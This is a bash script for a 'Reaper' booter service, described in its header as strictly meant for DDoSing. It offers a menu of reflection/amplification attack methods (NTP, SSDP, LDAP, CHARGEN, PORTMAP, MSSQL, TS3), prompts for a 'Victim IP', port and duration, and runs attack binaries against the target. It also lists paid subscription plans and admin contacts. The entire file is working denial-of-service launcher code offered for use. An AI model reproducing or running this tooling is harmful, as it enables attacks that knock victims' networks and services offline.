############ # This menu is strictly meant for DDoSing. 
# I created this off of the Reaper serverside
# Instead of using it for a botnet, use it as a menu for amplifications/IP header modifications :) 
############ 
#!/bin/bash 
BLACK='\e[0;30m' 
BLUE='\e[0;34m' 
GREEN='\e[0;32m' 
CYAN='\e[0;36m' 
RED='\e[0;31m' 
PURPLE='\e[0;35m' 
BROWN='\e[0;33m' 
LIGHTGRAY='\e[0;37m' 
DARKGRAY='\e[1;30m' 
LIGHTBLUE='\e[1;34m' 
LIGHTGREEN='\e[1;32m' 
LIGHTCYAN='\e[1;36m' 
LIGHTRED='\e[1;31m' 
LIGHTPURPLE='\e[1;35m' 
YELLOW='\e[1;33m' 
ULG='\e[4;1;32m' 
WHITE='\e[1;37m' 
NC='\e[0m' 
clear 
tput civis 
who am i >> logs.txt 
echo -n -e "${LIGHTRED}Loading the reaper! \r" 
sleep 1 
echo -n -e "${LIGHTRED}Loading Files [${WHITE}## ${LIGHTRED}(8%)\r" 
sleep 1 
echo -n -e "${LIGHTRED}Loading Files [${WHITE}######## ${LIGHTRED}(59%)\r" 
sleep 1 
echo -n -e "${LIGHTRED}Loading Files [${WHITE}#######################${LIGHTRED}] (100%) ${WHITE}Finished" 
sleep 2 
echo -ne '\n' 
tput cnorm 
while true 
do 
clear 
echo -e "
          ${RED}8888888b 
          ${RED}888   Y88b 
          ${RED}888    888 
          ${RED}888   d88P .d88b.   8888b.   88888b.   .d88b.  888d888
          ${RED}8888888b  d8P  Y8b      88b  888  88b d8P  Y8b 888P
          ${RED}888 T88b  88888888 .d888888  888  888 88888888 888
          ${RED}888  T88b Y8b.     888  888  888 d88P Y8b.     888
          ${RED}888   T88b  Y8888   Y888888  88888P     Y8888  888
                                       ${RED}888
                                       ${RED}888
                                       ${RED}888

          ${RED}**********************************************
          ${RED}*      ${WHITE}Welcome To The Reaper   ${RED}*
          ${RED}**********************************************
" 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e "${WHITE}[${RED}root${WHITE}@${RED}Reaper ${CYAN}~${WHITE}]${RED}# \c" 
read answer 
if [[ $answer == HELP ]] 
then 
clear 
echo -e "${LIGHTRED}Select An Option:" 
echo -e "${LIGHTGRAY}[${LIGHTGREEN}HELP${LIGHTGRAY}] -${WHITE}Shows Attack Commands" 
echo -e "${LIGHTGRAY}[${YELLOW}RULES${LIGHTGRAY}] -${WHITE}Show T.O.S Of ReaperNet" 
echo -e "${LIGHTGRAY}[${BLUE}PORTS${LIGHTGRAY}] -${WHITE}Shows Usable Ports" 
echo -e "${LIGHTGRAY}[${LIGHTPURPLE}STRESS${LIGHTGRAY}] -${WHITE}Shows Boot Tutorial" 
echo -e "${LIGHTGRAY}[${LIGHTCYAN}EXTRA${LIGHTGRAY}] -${WHITE}Shows Something For Skidz" 
echo -e "${LIGHTGRAY}[${LIGHTRED}ADMINS${LIGHTGRAY}] -${WHITE}Shows uers With Administrator access" 
echo -e "${LIGHTGRAY}[${WHITE}CONTACT${LIGHTGRAY}] -${WHITE}Shows Admin Contact Info And Plans" 
echo -e "${LIGHTGRAY}[${BROWN}PLANS${LIGHTGRAY}] -${WHITE}Shows A List of buyable Plans" 
echo -e "${WHITE}[${RED}root${WHITE}@${RED}Reaper ${CYAN}~${WHITE}]${RED}# " 
read 
fi 
if [[ $answer == help ]] 
then 
clear 
echo -e "" 
echo -e "${LIGHTRED}Select An Option:" 
echo -e "${LIGHTGRAY}[${LIGHTGREEN}HELP${LIGHTGRAY}] -${WHITE}Shows Attack Commands" 
echo -e "${LIGHTGRAY}[${YELLOW}RULES${LIGHTGRAY}] -${WHITE}Show T.O.S Of ReaperNet" 
echo -e "${LIGHTGRAY}[${BLUE}PORTS${LIGHTGRAY}] -${WHITE}Shows Usable Ports" 
echo -e "${LIGHTGRAY}[${LIGHTPURPLE}STRESS${LIGHTGRAY}] -${WHITE}Shows Boot Tutorial" 
echo -e "${LIGHTGRAY}[${LIGHTCYAN}EXTRA${LIGHTGRAY}] -${WHITE}Shows Something For Skidz" 
echo -e "${LIGHTGRAY}[${LIGHTRED}ADMINS${LIGHTGRAY}] -${WHITE}Shows uers With Administrator access" 
echo -e "${LIGHTGRAY}[${WHITE}CONTACT${LIGHTGRAY}] -${WHITE}Shows Admin Contact Info And Plans" 
echo -e "${LIGHTGRAY}[${BROWN}PLANS${LIGHTGRAY}] -${WHITE}Shows A List of buyable Plans" 
read 
fi 
if [[ $answer == RULES ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE}[${RED}+${WHITE}]${YELLOW}RULES${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${YELLOW}No Rapid Booting${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${YELLOW}No Sharing Users${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${YELLOW}No Going Over Time${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${YELLOW}No Using Scanner Commands${WHITE}[${RED}+${WHITE}]" 
read 
fi 
if [[ $answer == STRESS ]] 
then 
clear 
echo -e "${RED} /-----------------------------------------------------------\ " 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}LDAP ${WHITE}Protocol:${LIGHTPURPLE}UDP ${WHITE}Good For ${LIGHTCYAN}Home Connections ${RED} |" 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}SSDP ${WHITE}Protocol:${LIGHTPURPLE}UDP ${WHITE}Good For ${LIGHTCYAN}Home Connections ${RED} | " 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}TS3 ${WHITE}Protocol:${LIGHTPURPLE}TCP ${WHITE}Good For ${LIGHTCYAN}Teamspeak Servers${RED} | " 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}CHARGEN ${WHITE}Protocol:${LIGHTPURPLE}UDP ${WHITE}Good For ${LIGHTCYAN}Home Connections ${RED} | " 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}NTP ${WHITE}Protocol:${LIGHTPURPLE}TCP ${WHITE}Good For ${LIGHTCYAN}Home Connections ${RED} | " 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}PORTMAP ${WHITE}Protocol:${LIGHTPURPLE}TCP ${WHITE}Good For ${LIGHTCYAN}OVHs And Hotspots${RED} |" 
echo -e "${RED} | ${WHITE}Method:${LIGHTRED}MSSQL ${WHITE}Protocol:${LIGHTPURPLE}UDP ${WHITE}Good For ${LIGHTCYAN}High End Servers ${RED} | " 
echo -e "${RED} \-----------------------------------------------------------/ " 
read 
fi 
if [[ $answer == PORTS ]] 
then 
clear 
echo -e "${WHITE}[${RED}+${WHITE}]${BLUE}Ports${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${BLUE}22${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${BLUE}23${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${BLUE}53${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${BLUE}80${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${BLUE}443${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${BLUE}1723${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${BLUE}3074${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${BLUE}8080${WHITE}[${RED}+${WHITE}]" 
read 
fi 
if [[ $answer == EXTRA ]] 
then 
clear 
echo -e "${WHITE}[${RED}+${WHITE}]${LIGHTCYAN}EXTRA${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${LIGHTCYAN}This is for the retards${WHITE}[${RED}+${WHITE}] ${WHITE}[${RED}+${WHITE}]${LIGHTCYAN}Max time 1000${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${LIGHTCYAN}Don't spam 1000${WHITE}[${RED}+${WHITE}]" 
read 
fi 
if [[ $answer == ADMINS ]] 
then 
clear 
echo -e "${WHITE}[${RED}+${WHITE}]${LIGHTRED}ADMINS${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]${LIGHTRED}Vexvain${WHITE}[${RED}+${WHITE}]"  
read 
fi 
if [[ $answer == CONTACT ]] 
then 
clear 
echo -e "${WHITE}[${RED}+${WHITE}]Fuckoff${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]Vexvain#0578${WHITE}[${RED}+${WHITE}]" 
read 
fi 
if [[ $answer == PLANS ]] 
then 
clear 
echo -e "${WHITE}[${RED}+${WHITE}]1 Month = 15 ${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]2 months = 25 ${WHITE}[${RED}+${WHITE}]" 
echo -e "${WHITE}[${RED}+${WHITE}]Lifetime = 60 ${WHITE}[${RED}+${WHITE}]" 
fi 
if [[ $answer == CHARGEN ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} IP:${LIGHTCYAN}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} Port:${LIGHTCYAN}$port " 
echo -e " " 
echo -e "${WHITE} Time:${LIGHTCYAN}$time" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./chargen $ip $port chargen.txt 1 -1 $time 
fi 
if [[ $answer == TS3 ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ts3 $ip $port ts3.txt 1 -1 $time 
fi 
if [[ $answer == NTP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ntp $ip $port ntp.txt 1 -1 $time 
fi 
if [[ $answer == SSDP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ssdp $ip $port ssdp.txt 1 -1 $time 
fi 
if [[ $answer == SENTINEL ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./sentinel $ip $port sentinel.txt 1 -1 $time 
fi 
if [[ $answer == LDAP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ldap $ip $port ldap.txt 1 -1 $time 
fi 
if [[ $answer == PORTMAP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./portmap $ip $port portmap.txt 1 -1 $time 
fi 
if [[ $answer == MSSQL ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP: \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port: \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time: \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${RED}$ip ${WHITE}" 
echo -e " " 
echo -e "${WHITE} On Port:${RED}$port " 
echo -e " " 
echo -e "${WHITE} For:${RED}$time Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./mssql $ip $port mssql.txt 1 -1 $time 
read 
fi 
if [[ $answer == GEO ]] 
then 
clear 
echo -e "${WHITE} Enter IP:${RED} \c" 
read ip 
echo -e "" 
echo -e "To go back to the menu, click enter" 
echo -e "" 
curl ipinfo.io/$IP 
read 
fi 
done
